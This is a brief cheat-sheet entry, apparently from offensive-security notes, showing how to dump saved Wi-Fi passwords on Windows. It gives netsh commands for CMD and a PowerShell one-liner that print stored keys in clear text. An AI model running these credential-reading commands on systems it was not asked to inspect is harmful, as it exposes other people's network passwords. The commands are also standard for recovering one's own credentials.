- - -
## Wifi Password dump 🤑💰
Windows store their Wifi Password in Clear Text.

#### From CMD : 
```sh
netsh wlan export profile key=clear
type *.xml | find "KeyMaterial"
```

![Imgur](https://i.imgur.com/ZVJ0j64.png)


- - -
#### From PowerShell : 
```powershell
(netsh wlan show profiles) | Select-String "\:(.+)$"| %{$name=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
```

![Imgur](https://i.imgur.com/O6qeOyM.png)


- - -



